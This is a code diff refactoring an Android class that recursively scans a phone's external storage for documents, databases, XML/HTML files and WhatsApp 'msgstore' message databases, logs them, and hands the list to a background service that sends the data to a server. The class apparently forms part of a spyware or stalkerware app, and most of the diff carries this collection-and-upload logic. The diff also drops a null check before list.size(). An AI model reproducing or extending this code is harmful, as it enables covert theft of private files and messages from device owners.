@@ -22,21 +22,21 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.List;
 
-@SuppressWarnings("all")
 public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> implements Constant {
     private static final String TAG = FilesAsyncTask.class.getSimpleName();
+
     private DatabaseHelper databaseHelper = null;
     private Dao<Files, Integer> filesDao;
     private Context context;
     private ArrayList<File> fileList;
     private ArrayList<Files> lstFiles;
 
-    /* Sms Constructor */
+    // FilesAsyncTask Constructor
     public FilesAsyncTask(Context context) {
         this.context = context;
     }
 
-    /* DatabaseHelper */
+    // Database Helper
     private DatabaseHelper getHelper() {
         if (databaseHelper == null) {
             databaseHelper = OpenHelperManager.getHelper(context, DatabaseHelper.class);
@@ -47,14 +47,13 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
     @Override
     protected void onPreExecute() {
         super.onPreExecute();
-        lstFiles = new ArrayList<Files>();
+        lstFiles = new ArrayList<>();
     }
 
     @Override
     protected ArrayList<Files> doInBackground(String... params) {
-        fileList = new ArrayList<File>();
-        File root = new File(Environment.getExternalStorageDirectory()
-                .getAbsolutePath());
+        fileList = new ArrayList<>();
+        File root = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
         fileList = getFile(root);
 
         try {
@@ -65,15 +64,12 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
                     final QueryBuilder<Files, Integer> queryBuilder = filesDao.queryBuilder();
                     for (int i = 0; i < filesDao.queryForAll().size(); i++) {
                         for (int j = 0; j < fileList.size(); j++) {
-                            List<Files> results = queryBuilder.where()
-                                    .eq(Files.FILE_PATH,
-                                            fileList.get(j).getAbsolutePath()).query();
+                            List<Files> results = queryBuilder.where().eq(Files.FILE_PATH, fileList.get(j).getAbsolutePath()).query();
                             if (results.size() == 0) {
                                 setFilesPOJO(fileList, j);
                             }
                         }
                     }
-
                 } else {
                     for (int i = 0; i < fileList.size(); i++) {
                         setFilesPOJO(fileList, i);
@@ -85,7 +81,6 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
         }
 
         lstFiles = filesFetchWithTag(filesDao, params[0], params[1]);
-
         return lstFiles;
     }
 
@@ -97,54 +92,41 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
             OpenHelperManager.releaseHelper();
             databaseHelper = null;
         }
-        if (list != null && list.size() > 0)
-            Log.e("Size", "FILES List???" + list.size());
+
+        Log.e("Size", "FILES List???" + list.size());
         BackgroundDataService.getInstance().sendFilesDataToServer(list);
     }
 
     // Get Files List
-    public ArrayList<File> getFile(File dir) {
+    private ArrayList<File> getFile(File dir) {
         File listFile[] = dir.listFiles();
         if (listFile != null && listFile.length > 0) {
-
-            for (int i = 0; i < listFile.length; i++) {
-                if (listFile[i].isDirectory()) {
+            for (File file : listFile) {
+                if (file.isDirectory()) {
                     //fileList.add(listFile[i]);
-                    getFile(listFile[i]);
-
+                    getFile(file);
                 } else {
-
-                    if (listFile[i].getName().endsWith(".doc")
-                            || listFile[i].getName().endsWith(".pdf")
-                            || listFile[i].getName().endsWith(".txt")
-                            || listFile[i].getName().endsWith(".db")
-                            || listFile[i].getName().startsWith("msgstore")
-                            || listFile[i].getName().endsWith(".xml")
-                            || listFile[i].getName().endsWith(".html"))
-
-                    {
-
-                        fileList.add(listFile[i]);
+                    if (file.getName().endsWith(".doc") || file.getName().endsWith(".pdf") || file.getName().endsWith(".txt") || file.getName().endsWith(".db") || file.getName().startsWith("msgstore") || file.getName().endsWith(".xml") || file.getName().endsWith(".html")) {
+                        fileList.add(file);
                     }
                 }
-
             }
         }
         return fileList;
     }
 
-    /* Set Files POJO With File List*/
+    // Set Files POJO With File List
     private void setFilesPOJO(ArrayList<File> fileList, int i) {
         Files files = new Files();
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSSSZ");
         files.setDate_time(sdf.format(fileList.get(i).lastModified()));
         files.setDate_time_stamp(String.valueOf(fileList.get(i).lastModified()));
         files.setFilename(fileList.get(i).getName());
         files.setFilePath(fileList.get(i).getAbsolutePath());
         files.setFileStatus(FALSE);
         files.setFileExt(Utilities.getExtension(fileList.get(i).getName()));
-        files.setFileSizeKB(String.valueOf(getfileSizeKB(fileList.get(i).getAbsolutePath())));
-        files.setFileSizeMB(String.valueOf(getfileSizeMB(fileList.get(i).getAbsolutePath())));
+        files.setFileSizeKB(String.valueOf(getFileSizeKB(fileList.get(i).getAbsolutePath())));
+        files.setFileSizeMB(String.valueOf(getFileSizeMB(fileList.get(i).getAbsolutePath())));
 
         try {
             filesDao.create(files);
@@ -153,10 +135,10 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
         }
     }
 
-    /* Files Fetch With Tag*/
+    // Files Fetch With Tag
     private ArrayList<Files> filesFetchWithTag(Dao<Files, Integer> filesDao, String count, String ext) {
         ArrayList<Files> lstFilesSorted = new ArrayList<>();
-        List<Files> results = null;
+        List<Files> results;
         int countNew = 0;
         final QueryBuilder<Files, Integer> queryBuilder = filesDao.queryBuilder();
 
@@ -212,9 +194,8 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
         return lstFilesSorted;
     }
 
-    /* Check Count */
+    // Check Count
     private void checkCount(ArrayList<Files> lstFilesSorted, List<Files> results, String count, int countNew) {
-
         if (results != null && results.size() > 0) {
             if (Integer.parseInt(count) == results.size()) {
                 countNew = Integer.parseInt(count);
@@ -230,7 +211,7 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
         }
     }
 
-    /* Set Files POJO */
+    // Set Files POJO
     private void setFilesPOJO(ArrayList<Files> lstFilesSorted, List<Files> results, int i) {
         Files files = new Files();
         files.setFilename(results.get(i).getFilename());
@@ -244,7 +225,7 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
         lstFilesSorted.add(files);
     }
 
-    private long getfileSizeKB(String absolutePathOfImage) {
+    private long getFileSizeKB(String absolutePathOfImage) {
         Uri uriNew = Uri.fromFile(new File(absolutePathOfImage));
         long size = 0;
         try {
@@ -252,12 +233,12 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
             size = f.length();
             size = size / 1024;
         } catch (Exception e) {
-            Log.e("Exception", "Size??" + e.getMessage());
+            Log.e(TAG, "Exception??" + e.getMessage());
         }
         return size;
     }
 
-    private long getfileSizeMB(String absolutePathOfImage) {
+    private long getFileSizeMB(String absolutePathOfImage) {
         Uri uriNew = Uri.fromFile(new File(absolutePathOfImage));
         long size = 0;
         try {
@@ -265,11 +246,9 @@ public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> im
             size = f.length();
             size = size / 1024;
             size = size / 1024;
-
         } catch (Exception e) {
-            Log.e("Exception", "Size??" + e.getMessage());
+            Log.e(TAG, "Exception??" + e.getMessage());
         }
         return size;
     }
-
 }
